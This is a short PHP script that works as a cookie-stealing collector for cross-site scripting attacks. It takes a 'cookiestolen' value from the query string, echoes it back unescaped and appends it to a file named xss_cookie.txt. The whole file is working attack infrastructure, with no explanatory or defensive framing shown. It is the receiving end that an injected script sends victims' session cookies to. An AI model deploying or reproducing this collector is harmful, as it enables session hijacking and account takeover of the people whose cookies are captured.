<?php
$cookiestolen= $_GET["cookiestolen"];
echo "$cookiestolen";
$cookiestolen = "\n" . $cookiestolen;
$file = "xss_cookie.txt";
if (file_exists($file)) {
    echo "inside already  exist";
  file_put_contents($file, $cookiestolen, FILE_APPEND);
} else {
  file_put_contents($file, $cookiestolen);
}
?>